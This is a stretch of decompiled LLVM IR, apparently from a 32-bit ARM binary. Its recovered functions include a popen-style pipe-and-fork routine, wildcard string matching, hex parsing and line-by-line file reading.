define i32 @function_8fe8(i32 %arg1, i8* %arg2) local_unnamed_addr {
dec_label_pc_8fe8:
  %tmp = ptrtoint i8* %arg2 to i32
  %tmp3 = call i32 @__decompiler_undefined_function_0()
  %stack_var_-32 = alloca i32, align 4
  %stack_var_-4 = alloca i32, align 4
  %v3_8fec = load i32, i32* @fp, align 4
  store i32 36852, i32* %stack_var_-4, align 4
  %v2_8ff0 = ptrtoint i32* %stack_var_-4 to i32
  store i32 %v2_8ff0, i32* @fp, align 4
  %v2_9004 = load i8, i8* %arg2, align 1
  %v7_9008 = icmp eq i8 %v2_9004, 114
  br i1 %v7_9008, label %dec_label_pc_9020, label %dec_label_pc_9010

dec_label_pc_9010:                                ; preds = %dec_label_pc_8fe8
  %v2_9014 = load i8, i8* %arg2, align 1
  %v7_9018 = icmp eq i8 %v2_9014, 119
  br i1 %v7_9018, label %dec_label_pc_9020, label %dec_label_pc_9034

dec_label_pc_9020:                                ; preds = %dec_label_pc_9010, %dec_label_pc_8fe8
  %v1_9024 = add i32 %tmp, 1
  %v1_9028 = inttoptr i32 %v1_9024 to i8*
  %v2_9028 = load i8, i8* %v1_9028, align 1
  %v2_902c = icmp eq i8 %v2_9028, 0
  br i1 %v2_902c, label %dec_label_pc_9040, label %dec_label_pc_9034

dec_label_pc_9034:                                ; preds = %dec_label_pc_9010, %dec_label_pc_9020
  br label %dec_label_pc_924c

dec_label_pc_9040:                                ; preds = %dec_label_pc_9020
  %v2_9040 = ptrtoint i32* %stack_var_-32 to i32
  %v1_9048 = call i32 @function_104d4(i32 %v2_9040)
  store i32 %v1_9048, i32* @r0, align 4
  %v1_9050 = icmp slt i32 %v1_9048, 0
  br i1 %v1_9050, label %dec_label_pc_9058, label %dec_label_pc_9064

dec_label_pc_9058:                                ; preds = %dec_label_pc_9040
  br label %dec_label_pc_924c

dec_label_pc_9064:                                ; preds = %dec_label_pc_9040
  %v2_9068 = load i32, i32* @global_var_27718.29, align 4
  %v2_906c = icmp eq i32 %v2_9068, 0
  br i1 %v2_906c, label %dec_label_pc_9074, label %dec_label_pc_90f4

dec_label_pc_9074:                                ; preds = %dec_label_pc_9064
  %v0_9074 = call i32 @function_10644()
  %v5_9088 = icmp sgt i32 %v0_9074, 0
  br i1 %v5_9088, label %dec_label_pc_9098, label %dec_label_pc_908c

dec_label_pc_908c:                                ; preds = %dec_label_pc_9074
  br label %dec_label_pc_924c

dec_label_pc_9098:                                ; preds = %dec_label_pc_9074
  %v3_909c = mul i32 %v0_9074, 4
  %v1_90a4 = call i32 @function_12b00(i32 %v3_909c)
  store i32 %v1_90a4, i32* @global_var_27718.29, align 4
  %v2_90c0 = icmp eq i32 %v1_90a4, 0
  br i1 %v2_90c0, label %dec_label_pc_90c8, label %dec_label_pc_90d4

dec_label_pc_90c8:                                ; preds = %dec_label_pc_9098
  br label %dec_label_pc_924c

dec_label_pc_90d4:                                ; preds = %dec_label_pc_9098
  store i32 %v3_909c, i32* @r2, align 4
  %v2_90f0 = inttoptr i32 %v1_90a4 to i8*
  %v3_90f0 = call i32 @function_11f30(i8* %v2_90f0, i32 0)
  store i32 %v3_90f0, i32* @r0, align 4
  br label %dec_label_pc_90f4

dec_label_pc_90f4:                                ; preds = %dec_label_pc_9064, %dec_label_pc_90d4
  %v0_90f4 = call i32 @function_10400()
  %v7_910c = icmp eq i32 %v0_90f4, -1
  br i1 %v7_910c, label %dec_label_pc_9124, label %dec_label_pc_9114

dec_label_pc_9114:                                ; preds = %dec_label_pc_90f4
  %v2_9118 = icmp eq i32 %v0_90f4, 0
  br i1 %v2_9118, label %dec_label_pc_9148, label %dec_label_pc_91e8

dec_label_pc_9124:                                ; preds = %dec_label_pc_90f4
  %v3_9124 = load i32, i32* %stack_var_-32, align 4
  %v1_912c = call i32 @function_108d0(i32 %v3_9124)
  %v1_9138 = call i32 @function_108d0(i32 %tmp3)
  br label %dec_label_pc_924c

dec_label_pc_9148:                                ; preds = %dec_label_pc_9114
  %v3_914c = load i8, i8* %arg2, align 1
  %v7_9150 = icmp eq i8 %v3_914c, 114
  br i1 %v7_9150, label %dec_label_pc_9158, label %dec_label_pc_9190

dec_label_pc_9158:                                ; preds = %dec_label_pc_9148
  %v7_915c = icmp eq i32 %tmp3, 1
  br i1 %v7_915c, label %dec_label_pc_9180, label %dec_label_pc_9164

dec_label_pc_9164:                                ; preds = %dec_label_pc_9158
  %v4_9170 = call i32 @function_10440(i32 %tmp3, i32 1, i32 %tmp)
  %v1_917c = call i32 @function_108d0(i32 %tmp3)
  br label %dec_label_pc_9180

dec_label_pc_9180:                                ; preds = %dec_label_pc_9158, %dec_label_pc_9164
  %v3_9180 = load i32, i32* %stack_var_-32, align 4
  %v1_9188 = call i32 @function_108d0(i32 %v3_9180)
  br label %dec_label_pc_91c4

dec_label_pc_9190:                                ; preds = %dec_label_pc_9148
  %v3_9190 = load i32, i32* %stack_var_-32, align 4
  %v2_9194 = icmp eq i32 %v3_9190, 0
  br i1 %v2_9194, label %dec_label_pc_91b8, label %dec_label_pc_919c

dec_label_pc_919c:                                ; preds = %dec_label_pc_9190
  %v4_91a8 = call i32 @function_10440(i32 %v3_9190, i32 0, i32 %tmp)
  %v3_91ac = load i32, i32* %stack_var_-32, align 4
  %v1_91b4 = call i32 @function_108d0(i32 %v3_91ac)
  br label %dec_label_pc_91b8

dec_label_pc_91b8:                                ; preds = %dec_label_pc_9190, %dec_label_pc_919c
  %v1_91c0 = call i32 @function_108d0(i32 %tmp3)
  br label %dec_label_pc_91c4

dec_label_pc_91c4:                                ; preds = %dec_label_pc_9180, %dec_label_pc_91b8
  %v8_91dc = call i32 @function_14ab4(i32 ptrtoint ([8 x i8]* @global_var_19a38.31 to i32), i32 ptrtoint ([3 x i8]* @global_var_19a40.33 to i32), i32 ptrtoint ([3 x i8]* @global_var_19a44.35 to i32), i32 %arg1, i32 0)
  %v1_91e4 = call i32 @function_1086c(i32 127)
  br label %dec_label_pc_91e8

dec_label_pc_91e8:                                ; preds = %dec_label_pc_9114, %dec_label_pc_91c4
  %v2_91ec = load i8, i8* %arg2, align 1
  %v7_91f0 = icmp eq i8 %v2_91ec, 114
  br i1 %v7_91f0, label %dec_label_pc_91f8, label %dec_label_pc_9210

dec_label_pc_91f8:                                ; preds = %dec_label_pc_91e8
  %v3_91f8 = load i32, i32* %stack_var_-32, align 4
  %v1_9208 = call i32 @function_108d0(i32 %tmp3)
  br label %dec_label_pc_9224

dec_label_pc_9210:                                ; preds = %dec_label_pc_91e8
  %v3_9218 = load i32, i32* %stack_var_-32, align 4
  %v1_9220 = call i32 @function_108d0(i32 %v3_9218)
  br label %dec_label_pc_9224

dec_label_pc_9224:                                ; preds = %dec_label_pc_91f8, %dec_label_pc_9210
  %stack_var_-40.0 = phi i32 [ %v3_91f8, %dec_label_pc_91f8 ], [ %tmp3, %dec_label_pc_9210 ]
  %v3_9228 = mul i32 %stack_var_-40.0, 4
  %v2_9234 = load i32, i32* @global_var_27718.29, align 4
  %v2_9238 = add i32 %v2_9234, %v3_9228
  %v2_9240 = inttoptr i32 %v2_9238 to i32*
  store i32 %v0_90f4, i32* %v2_9240, align 4
  br label %dec_label_pc_924c

dec_label_pc_924c:                                ; preds = %dec_label_pc_9124, %dec_label_pc_90c8, %dec_label_pc_908c, %dec_label_pc_9058, %dec_label_pc_9034, %dec_label_pc_9224
  %stack_var_-44.0 = phi i32 [ -1, %dec_label_pc_9058 ], [ -1, %dec_label_pc_90c8 ], [ -1, %dec_label_pc_9124 ], [ %stack_var_-40.0, %dec_label_pc_9224 ], [ -1, %dec_label_pc_908c ], [ -1, %dec_label_pc_9034 ]
  store i32 %v3_8fec, i32* @fp, align 4
  ret i32 %stack_var_-44.0

; uselistorder directives
  uselistorder i32 %stack_var_-40.0, { 1, 0 }
  uselistorder i32 %v0_90f4, { 1, 2, 0 }
  uselistorder i32 %v3_909c, { 1, 0 }
  uselistorder i32* %stack_var_-4, { 1, 0 }
  uselistorder i32 %tmp3, { 0, 6, 5, 4, 3, 2, 1 }
  uselistorder i32 (i32, i32, i32)* @function_10440, { 1, 0 }
  uselistorder i8* %arg2, { 1, 2, 0, 3, 4 }
  uselistorder label %dec_label_pc_924c, { 5, 0, 1, 2, 3, 4 }
  uselistorder label %dec_label_pc_9224, { 1, 0 }
  uselistorder label %dec_label_pc_91e8, { 1, 0 }
  uselistorder label %dec_label_pc_91c4, { 1, 0 }
  uselistorder label %dec_label_pc_91b8, { 1, 0 }
  uselistorder label %dec_label_pc_9180, { 1, 0 }
  uselistorder label %dec_label_pc_90f4, { 1, 0 }
  uselistorder label %dec_label_pc_9034, { 1, 0 }
}

define i32 @function_9270(i32 %arg1) local_unnamed_addr {
dec_label_pc_9270:
  %tmp6 = call i32 @__decompiler_undefined_function_0()
  %stack_var_-40 = alloca i32, align 4
  %stack_var_-28 = alloca i32, align 4
  %stack_var_-36 = alloca i32, align 4
  %v2_9288 = load i32, i32* @global_var_27718.29, align 4
  %v2_928c = icmp eq i32 %v2_9288, 0
  br i1 %v2_928c, label %dec_label_pc_93e0, label %dec_label_pc_9294

dec_label_pc_9294:                                ; preds = %dec_label_pc_9270
  %v3_9298 = mul i32 %arg1, 4
  %v2_92a8 = add i32 %v2_9288, %v3_9298
  %v1_92ac = inttoptr i32 %v2_92a8 to i32*
  %v2_92ac = load i32, i32* %v1_92ac, align 4
  %v2_92b0 = icmp eq i32 %v2_92ac, 0
  br i1 %v2_92b0, label %dec_label_pc_93e0, label %dec_label_pc_92c4

dec_label_pc_92c4:                                ; preds = %dec_label_pc_9294
  %v1_92c8 = call i32 @function_108d0(i32 %arg1)
  %v2_92cc = ptrtoint i32* %stack_var_-36 to i32
  %v2_92d4 = call i32 @function_12950(i32* nonnull %stack_var_-36)
  store i32 %v2_92cc, i32* @r0, align 4
  %v2_92e4 = call i32 @function_1290c(i32 %v2_92cc, i32 2)
  store i32 %v2_92cc, i32* @r0, align 4
  %v2_92f4 = call i32 @function_1290c(i32 %v2_92cc, i32 3)
  store i32 %v2_92cc, i32* @r0, align 4
  %v2_9304 = call i32 @function_1290c(i32 %v2_92cc, i32 1)
  %v2_930c = ptrtoint i32* %stack_var_-28 to i32
  %v4_9318 = call i32 @function_10898(i32 0, i32 %v2_92cc, i32 %v2_930c, i32 %v2_92cc)
  %v2_9338 = ptrtoint i32* %stack_var_-40 to i32
  br label %dec_label_pc_931c

dec_label_pc_931c:                                ; preds = %dec_label_pc_9360, %dec_label_pc_92c4
  %v2_932c = load i32, i32* @global_var_27718.29, align 4
  %v2_9330 = add i32 %v2_932c, %v3_9298
  %v1_9334 = inttoptr i32 %v2_9330 to i32*
  %v2_9334 = load i32, i32* %v1_9334, align 4
  store i32 %v2_9334, i32* @r0, align 4
  %v3_9348 = call i32 @function_10580(i32 %v2_9334, i32 %v2_9338, i32 0)
  %v3_9358 = icmp eq i32 %v3_9348, -1
  %v8_9358 = icmp eq i32 %v3_9348, -1
  br i1 %v3_9358, label %dec_label_pc_9360, label %dec_label_pc_9374

dec_label_pc_9360:                                ; preds = %dec_label_pc_931c
  %v0_9360 = call i32 @function_1095c()
  %v1_9368 = inttoptr i32 %v0_9360 to i32*
  %v2_9368 = load i32, i32* %v1_9368, align 4
  %v7_936c = icmp eq i32 %v2_9368, 4
  br i1 %v7_936c, label %dec_label_pc_931c, label %dec_label_pc_9374

dec_label_pc_9374:                                ; preds = %dec_label_pc_931c, %dec_label_pc_9360
  %v4_9384 = call i32 @function_10898(i32 2, i32 %v2_930c, i32 0, i32 %v2_930c)
  %v3_938c = mul i32 %tmp6, 4
  %v2_9398 = load i32, i32* @global_var_27718.29, align 4
  %v2_939c = add i32 %v2_9398, %v3_938c
  %v2_93a4 = inttoptr i32 %v2_939c to i32*
  store i32 0, i32* %v2_93a4, align 4
  br i1 %v8_9358, label %dec_label_pc_93e0, label %dec_label_pc_93b4

dec_label_pc_93b4:                                ; preds = %dec_label_pc_9374
  %v3_93b4 = load i32, i32* %stack_var_-40, align 4
  %v1_93c0 = and i32 %v3_93b4, 65280
  %v3_93c41 = udiv i32 %v1_93c0, 256
  br label %dec_label_pc_93e0

dec_label_pc_93e0:                                ; preds = %dec_label_pc_93b4, %dec_label_pc_9374, %dec_label_pc_9270, %dec_label_pc_9294
  %storemerge = phi i32 [ -1, %dec_label_pc_9294 ], [ -1, %dec_label_pc_9270 ], [ %v3_93c41, %dec_label_pc_93b4 ], [ -1, %dec_label_pc_9374 ]
  ret i32 %storemerge

; uselistorder directives
  uselistorder i32 %v2_930c, { 1, 0, 2 }
  uselistorder i32 %v2_92cc, { 0, 1, 3, 2, 5, 4, 7, 6 }
  uselistorder i32 %v3_9298, { 1, 0 }
  uselistorder i32 (i32, i32)* @function_1290c, { 2, 1, 0 }
  uselistorder i32* @global_var_27718.29, { 1, 2, 3, 4, 0, 5 }
  uselistorder i32 %arg1, { 1, 0 }
  uselistorder label %dec_label_pc_93e0, { 0, 1, 3, 2 }
  uselistorder label %dec_label_pc_9374, { 1, 0 }
}

define i32 @function_93f8(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
dec_label_pc_93f8:
  br label %dec_label_pc_9468

dec_label_pc_9428:                                ; preds = %dec_label_pc_9478
  %v1_9444 = call i32 @function_10610(i32 %arg3)
  %v1_9454 = add nuw i32 %storemerge25, 1
  %v7_9460 = icmp eq i32 %v1_9444, 1
  br i1 %v7_9460, label %dec_label_pc_9468, label %dec_label_pc_9498

dec_label_pc_9468:                                ; preds = %dec_label_pc_93f8, %dec_label_pc_9428
  %storemerge25 = phi i32 [ 0, %dec_label_pc_93f8 ], [ %v1_9454, %dec_label_pc_9428 ]
  %v6_9474 = icmp slt i32 %storemerge25, %arg2
  br i1 %v6_9474, label %dec_label_pc_9478, label %dec_label_pc_9498

dec_label_pc_9478:                                ; preds = %dec_label_pc_9468
  %v2_9484 = add i32 %storemerge25, %arg1
  %v1_9488 = add i32 %v2_9484, -1
  %v1_948c = inttoptr i32 %v1_9488 to i8*
  %v2_948c = load i8, i8* %v1_948c, align 1
  %v7_9490 = icmp eq i8 %v2_948c, 10
  br i1 %v7_9490, label %dec_label_pc_9498, label %dec_label_pc_9428

dec_label_pc_9498:                                ; preds = %dec_label_pc_9478, %dec_label_pc_9468, %dec_label_pc_9428
  %stack_var_-24.0.lcssa = phi i32 [ 1, %dec_label_pc_9478 ], [ 1, %dec_label_pc_9468 ], [ %v1_9444, %dec_label_pc_9428 ]
  %v2_949c = icmp eq i32 %stack_var_-24.0.lcssa, 0
  %storemerge3 = select i1 %v2_949c, i32 0, i32 %arg1
  ret i32 %storemerge3

; uselistorder directives
  uselistorder i32 %v1_9444, { 1, 0 }
  uselistorder i32 %arg1, { 1, 0 }
  uselistorder label %dec_label_pc_9468, { 1, 0 }
}

define i32 @function_94cc(i8* %arg1, i32 %arg2) local_unnamed_addr {
dec_label_pc_94cc:
  %tmp = ptrtoint i8* %arg1 to i32
  %v2_95202 = load i8, i8* %arg1, align 1
  %v2_95244 = icmp eq i8 %v2_95202, 0
  br i1 %v2_95244, label %dec_label_pc_9538, label %dec_label_pc_952c

dec_label_pc_94ec:                                ; preds = %dec_label_pc_952c
  %v3_94f0 = mul i32 %stack_var_-20.06, 16
  %v2_94f8 = load i8, i8* %stack_var_-28.05, align 1
  %v3_94f8 = zext i8 %v2_94f8 to i32
  %v4_9504 = mul nuw nsw i32 %v3_94f8, 4
  %v5_9504 = add i32 %v4_9504, ptrtoint (i32* @global_var_19a48.38 to i32)
  %v6_9504 = inttoptr i32 %v5_9504 to i32*
  %v7_9504 = load i32, i32* %v6_9504, align 4
  %v2_9508 = or i32 %v7_9504, %v3_94f0
  %v1_9514 = add i32 %v4_951c7, 1
  %v5_9518 = inttoptr i32 %v1_9514 to i8*
  %v2_9520 = load i8, i8* %v5_9518, align 1
  %v2_9524 = icmp eq i8 %v2_9520, 0
  br i1 %v2_9524, label %dec_label_pc_9538, label %dec_label_pc_952c

dec_label_pc_952c:                                ; preds = %dec_label_pc_94cc, %dec_label_pc_94ec
  %v4_951c7 = phi i32 [ %v1_9514, %dec_label_pc_94ec ], [ %tmp, %dec_label_pc_94cc ]
  %stack_var_-20.06 = phi i32 [ %v2_9508, %dec_label_pc_94ec ], [ 0, %dec_label_pc_94cc ]
  %stack_var_-28.05 = phi i8* [ %v5_9518, %dec_label_pc_94ec ], [ %arg1, %dec_label_pc_94cc ]
  %v1_9530 = icmp slt i32 %stack_var_-20.06, 0
  br i1 %v1_9530, label %dec_label_pc_9538, label %dec_label_pc_94ec

dec_label_pc_9538:                                ; preds = %dec_label_pc_94ec, %dec_label_pc_952c, %dec_label_pc_94cc
  %stack_var_-20.0.lcssa = phi i32 [ 0, %dec_label_pc_94cc ], [ %v2_9508, %dec_label_pc_94ec ], [ %stack_var_-20.06, %dec_label_pc_952c ]
  ret i32 %stack_var_-20.0.lcssa

; uselistorder directives
  uselistorder i32 %stack_var_-20.06, { 1, 2, 0 }
  uselistorder label %dec_label_pc_9538, { 1, 0, 2 }
  uselistorder label %dec_label_pc_952c, { 1, 0 }
}

define i32 @function_9550(i8* %arg1, i32 %arg2) local_unnamed_addr {
dec_label_pc_9550:
  %tmp = inttoptr i32 %arg2 to i8*
  %tmp8 = ptrtoint i8* %arg1 to i32
  %stack_var_-4 = alloca i32, align 4
  %v3_9554 = load i32, i32* @r4, align 4
  %v6_9554 = load i32, i32* @fp, align 4
  store i32 38236, i32* %stack_var_-4, align 4
  %v2_9558 = ptrtoint i32* %stack_var_-4 to i32
  store i32 %v2_9558, i32* @fp, align 4
  %v2_956c = load i8, i8* %arg1, align 1
  %v7_9578 = icmp eq i8 %v2_956c, 42
  br i1 %v7_9578, label %dec_label_pc_95ac, label %dec_label_pc_9580

dec_label_pc_9580:                                ; preds = %dec_label_pc_9550
  %v7_9584 = icmp eq i8 %v2_956c, 63
  br i1 %v7_9584, label %dec_label_pc_961c, label %dec_label_pc_958c

dec_label_pc_958c:                                ; preds = %dec_label_pc_9580
  %v2_9590 = icmp eq i8 %v2_956c, 0
  br i1 %v2_9590, label %dec_label_pc_959c, label %dec_label_pc_9674

dec_label_pc_959c:                                ; preds = %dec_label_pc_958c
  %v2_95a0 = load i8, i8* %tmp, align 1
  %v3_95a0 = zext i8 %v2_95a0 to i32
  br label %dec_label_pc_96e8

dec_label_pc_95ac:                                ; preds = %dec_label_pc_9550
  %v1_95b0 = add i32 %tmp8, 1
  %v3_95bc = inttoptr i32 %v1_95b0 to i8*
  %v4_95bc = call i32 @function_9550(i8* %v3_95bc, i32 %arg2)
  %v2_95c4 = icmp eq i32 %v4_95bc, 0
  br i1 %v2_95c4, label %dec_label_pc_9608, label %dec_label_pc_95cc

dec_label_pc_95cc:                                ; preds = %dec_label_pc_95ac
  %v2_95d0 = load i8, i8* %tmp, align 1
  %v2_95d4 = icmp eq i8 %v2_95d0, 0
  br i1 %v2_95d4, label %dec_label_pc_9610, label %dec_label_pc_95dc

dec_label_pc_95dc:                                ; preds = %dec_label_pc_95cc
  %v1_95e0 = add i32 %arg2, 1
  %v4_95ec = call i32 @function_9550(i8* nonnull %arg1, i32 %v1_95e0)
  %v2_95f4 = icmp eq i32 %v4_95ec, 0
  br i1 %v2_95f4, label %dec_label_pc_9608, label %dec_label_pc_9610

dec_label_pc_9608:                                ; preds = %dec_label_pc_95dc, %dec_label_pc_95ac
  br label %dec_label_pc_9610

dec_label_pc_9610:                                ; preds = %dec_label_pc_95cc, %dec_label_pc_95dc, %dec_label_pc_9608
  %storemerge3 = phi i32 [ 0, %dec_label_pc_9608 ], [ 1, %dec_label_pc_95dc ], [ 1, %dec_label_pc_95cc ]
  br label %dec_label_pc_96e8

dec_label_pc_961c:                                ; preds = %dec_label_pc_9580
  %v2_9620 = load i8, i8* %tmp, align 1
  %v2_9624 = icmp eq i8 %v2_9620, 0
  br i1 %v2_9624, label %dec_label_pc_9668, label %dec_label_pc_962c

dec_label_pc_962c:                                ; preds = %dec_label_pc_961c
  %v1_9630 = add i32 %tmp8, 1
  %v1_9638 = add i32 %arg2, 1
  %v2_9644 = inttoptr i32 %v1_9630 to i8*
  %v3_9644 = call i32 @function_9550(i8* %v2_9644, i32 %v1_9638)
  %v2_964c = icmp ne i32 %v3_9644, 0
  %. = zext i1 %v2_964c to i32
  br label %dec_label_pc_9668

dec_label_pc_9668:                                ; preds = %dec_label_pc_962c, %dec_label_pc_961c
  %storemerge2 = phi i32 [ 1, %dec_label_pc_961c ], [ %., %dec_label_pc_962c ]
  br label %dec_label_pc_96e8

dec_label_pc_9674:                                ; preds = %dec_label_pc_958c
  %v2_9678 = load i8, i8* %arg1, align 1
  %v3_9678 = zext i8 %v2_9678 to i32
  %v1_9680 = call i32 @function_1092c(i32 %v3_9678)
  store i32 %v1_9680, i32* @r4, align 4
  %v2_968c = load i8, i8* %tmp, align 1
  %v3_968c = zext i8 %v2_968c to i32
  %v1_9694 = call i32 @function_1092c(i32 %v3_968c)
  %v0_969c = load i32, i32* @r4, align 4
  %v9_969c = icmp eq i32 %v0_969c, %v1_9694
  br i1 %v9_969c, label %dec_label_pc_96a4, label %dec_label_pc_96e0

dec_label_pc_96a4:                                ; preds = %dec_label_pc_9674
  %v1_96a8 = add i32 %tmp8, 1
  %v1_96b0 = add i32 %arg2, 1
  %v2_96bc = inttoptr i32 %v1_96a8 to i8*
  %v3_96bc = call i32 @function_9550(i8* %v2_96bc, i32 %v1_96b0)
  %v2_96c4 = icmp ne i32 %v3_96bc, 0
  %.7 = zext i1 %v2_96c4 to i32
  br label %dec_label_pc_96e0

dec_label_pc_96e0:                                ; preds = %dec_label_pc_96a4, %dec_label_pc_9674
  %storemerge = phi i32 [ 1, %dec_label_pc_9674 ], [ %.7, %dec_label_pc_96a4 ]
  br label %dec_label_pc_96e8

dec_label_pc_96e8:                                ; preds = %dec_label_pc_9668, %dec_label_pc_9610, %dec_label_pc_959c, %dec_label_pc_96e0
  %stack_var_-48.0 = phi i32 [ %storemerge3, %dec_label_pc_9610 ], [ %storemerge2, %dec_label_pc_9668 ], [ %v3_95a0, %dec_label_pc_959c ], [ %storemerge, %dec_label_pc_96e0 ]
  store i32 %v3_9554, i32* @r4, align 4
  store i32 %v6_9554, i32* @fp, align 4
  ret i32 %stack_var_-48.0

; uselistorder directives
  uselistorder i32* %stack_var_-4, { 1, 0 }
  uselistorder i8* %tmp, { 0, 2, 3, 1 }
  uselistorder i32 %arg2, { 3, 2, 0, 1, 4 }
  uselistorder label %dec_label_pc_96e8, { 3, 0, 1, 2 }
  uselistorder label %dec_label_pc_9610, { 2, 1, 0 }
}

define i32 @function_96fc(i32 %arg1, i32* %arg2) local_unnamed_addr {
dec_label_pc_96fc:
  %stack_var_0 = alloca i32, align 4
  %v1_96fc = ptrtoint i32* %stack_var_0 to i32
  store i32 %v1_96fc, i32* @ip, align 4
  store i32 %arg1, i32* @r0, align 4
  %v1_971c = call i32 @function_126e8(i32 %arg1)
  store i32 %v1_971c, i32* %arg2, align 4
  %v3_9734 = icmp eq i32 %v1_971c, -1
  %. = zext i1 %v3_9734 to i32
  ret i32 %.

; uselistorder directives
  uselistorder i32 %arg1, { 1, 0 }
}

define i32 @function_9764(i8* %arg1) local_unnamed_addr {
dec_label_pc_9764:
  %r0.global-to-local = alloca i32, align 4
  %tmp = ptrtoint i8* %arg1 to i32
  store i32 %tmp, i32* %r0.global-to-local, align 4
  %v0_9774 = load i32, i32* %r0.global-to-local, align 4
  %storemerge2 = inttoptr i32 %v0_9774 to i8*
  %v2_97ac3 = load i8, i8* %storemerge2, align 1
  %v2_97b05 = icmp eq i8 %v2_97ac3, 0
  br i1 %v2_97b05, label %dec_label_pc_97b8, label %dec_label_pc_977c

dec_label_pc_977c:                                ; preds = %dec_label_pc_9764, %dec_label_pc_977c
  %storemerge7 = phi i8* [ %storemerge, %dec_label_pc_977c ], [ %storemerge2, %dec_label_pc_9764 ]
  %storemerge.in6 = phi i32 [ %v1_97a0, %dec_label_pc_977c ], [ %v0_9774, %dec_label_pc_9764 ]
  %v2_9780 = load i8, i8* %storemerge7, align 1
  %v3_9780 = zext i8 %v2_9780 to i32
  store i32 %v3_9780, i32* %r0.global-to-local, align 4
  %v1_9788 = call i32 @function_1092c(i32 %v3_9780)
  store i32 %v1_9788, i32* %r0.global-to-local, align 4
  %v1_9798 = trunc i32 %v1_9788 to i8
  store i8 %v1_9798, i8* %storemerge7, align 1
  %v1_97a0 = add i32 %storemerge.in6, 1
  %storemerge = inttoptr i32 %v1_97a0 to i8*
  %v2_97ac = load i8, i8* %storemerge, align 1
  %v2_97b0 = icmp eq i8 %v2_97ac, 0
  br i1 %v2_97b0, label %dec_label_pc_97a8.dec_label_pc_97b8_crit_edge, label %dec_label_pc_977c

dec_label_pc_97a8.dec_label_pc_97b8_crit_edge:    ; preds = %dec_label_pc_977c
  %v1_97c0.pre = load i32, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_97b8

dec_label_pc_97b8:                                ; preds = %dec_label_pc_97a8.dec_label_pc_97b8_crit_edge, %dec_label_pc_9764
  %v1_97c0 = phi i32 [ %v1_97c0.pre, %dec_label_pc_97a8.dec_label_pc_97b8_crit_edge ], [ %v0_9774, %dec_label_pc_9764 ]
  ret i32 %v1_97c0

; uselistorder directives
  uselistorder i8* %storemerge, { 1, 0 }
  uselistorder i32 %v1_97a0, { 1, 0 }
  uselistorder i8* %storemerge7, { 1, 0 }
  uselistorder i32 %v0_9774, { 1, 0, 2 }
  uselistorder i32* %r0.global-to-local, { 3, 4, 2, 0, 1 }
  uselistorder label %dec_label_pc_977c, { 1, 0 }
}

define i32 @function_97c4(i32 %arg1, i32 %arg2) local_unnamed_addr {
dec_label_pc_97c4:
  %stack_var_-4128 = alloca i32, align 4
  %stack_var_-4120 = alloca i32, align 4
  %stack_var_-24 = alloca i32, align 4
  store i32 -4108, i32* @r3, align 4
  %v2_97e0 = ptrtoint i32* %stack_var_-24 to i32
  store i32 %v2_97e0, i32* @r2, align 4
  %v3_97f0 = call i32 @function_10474(i32 ptrtoint ([14 x i8]* @global_var_19e48.40 to i32), i32 0)
  %v2_99a8 = ptrtoint i32* %stack_var_-4128 to i32
  %v1_9810 = bitcast i32* %stack_var_-4128 to i8*
  br label %dec_label_pc_99a0

dec_label_pc_9800:                                ; preds = %dec_label_pc_99a0
  %v2_9810 = call i32 @function_9764(i8* %v1_9810)
  %v4_9828 = call i32 @function_12060(i32 %v2_99a8, i8* getelementptr inbounds ([9 x i8], [9 x i8]* @global_var_19e58.42, i32 0, i32 0))
  %v9_9840 = icmp eq i32 %v4_9828, %v2_99a8
  br i1 %v9_9840, label %dec_label_pc_9848, label %dec_label_pc_9984

dec_label_pc_9848:                                ; preds = %dec_label_pc_9800
  %tmp21 = bitcast i32* %stack_var_-4120 to i8*
  br label %dec_label_pc_986c

dec_label_pc_9860:                                ; preds = %dec_label_pc_988c, %dec_label_pc_987c, %dec_label_pc_986c
  %v1_9864 = add i32 %v4_986c, 1
  %v5_9868 = inttoptr i32 %v1_9864 to i8*
  br label %dec_label_pc_986c

dec_label_pc_986c:                                ; preds = %dec_label_pc_9848, %dec_label_pc_9860
  %storemerge2 = phi i8* [ %v5_9868, %dec_label_pc_9860 ], [ %tmp21, %dec_label_pc_9848 ]
  %v4_986c = ptrtoint i8* %storemerge2 to i32
  %v2_9870 = load i8, i8* %storemerge2, align 1
  %v7_9874 = icmp eq i8 %v2_9870, 32
  br i1 %v7_9874, label %dec_label_pc_9860, label %dec_label_pc_987c

dec_label_pc_987c:                                ; preds = %dec_label_pc_986c
  %v2_9880 = load i8, i8* %storemerge2, align 1
  %v7_9884 = icmp eq i8 %v2_9880, 9
  br i1 %v7_9884, label %dec_label_pc_9860, label %dec_label_pc_988c

dec_label_pc_988c:                                ; preds = %dec_label_pc_987c
  %v2_9890 = load i8, i8* %storemerge2, align 1
  %v7_9894 = icmp eq i8 %v2_9890, 58
  br i1 %v7_9894, label %dec_label_pc_9860, label %dec_label_pc_98c4.preheader

dec_label_pc_98c4.preheader:                      ; preds = %dec_label_pc_988c
  %v1_98c8 = add i32 %v4_986c, -1
  br label %dec_label_pc_98c4

dec_label_pc_98a0:                                ; preds = %dec_label_pc_98ec, %dec_label_pc_98c4
  store i32 %v4_986c, i32* @r0, align 4
  %v0_98b0 = call i32 @function_11fd0()
  %v2_98b8 = add i32 %v1_98c8, %v0_98b0
  %v3_98c0 = inttoptr i32 %v2_98b8 to i8*
  store i8 0, i8* %v3_98c0, align 1
  br label %dec_label_pc_98c4

dec_label_pc_98c4:                                ; preds = %dec_label_pc_98c4.preheader, %dec_label_pc_98a0
  store i32 %v4_986c, i32* @r0, align 4
  %v0_98d4 = call i32 @function_11fd0()
  %v2_98dc = add i32 %v1_98c8, %v0_98d4
  %v1_98e0 = inttoptr i32 %v2_98dc to i8*
  %v2_98e0 = load i8, i8* %v1_98e0, align 1
  %v7_98e4 = icmp eq i8 %v2_98e0, 13
  br i1 %v7_98e4, label %dec_label_pc_98a0, label %dec_label_pc_98ec

dec_label_pc_98ec:                                ; preds = %dec_label_pc_98c4
  store i32 %v1_98c8, i32* @r4, align 4
  store i32 %v4_986c, i32* @r0, align 4
  %v0_98fc = call i32 @function_11fd0()
  %v0_9904 = load i32, i32* @r4, align 4
  %v2_9904 = add i32 %v0_9904, %v0_98fc
  %v1_9908 = inttoptr i32 %v2_9904 to i8*
  %v2_9908 = load i8, i8* %v1_9908, align 1
  %v7_990c = icmp eq i8 %v2_9908, 10
  br i1 %v7_990c, label %dec_label_pc_98a0, label %dec_label_pc_9914

dec_label_pc_9914:                                ; preds = %dec_label_pc_98ec
  store i32 %v4_986c, i32* @r0, align 4
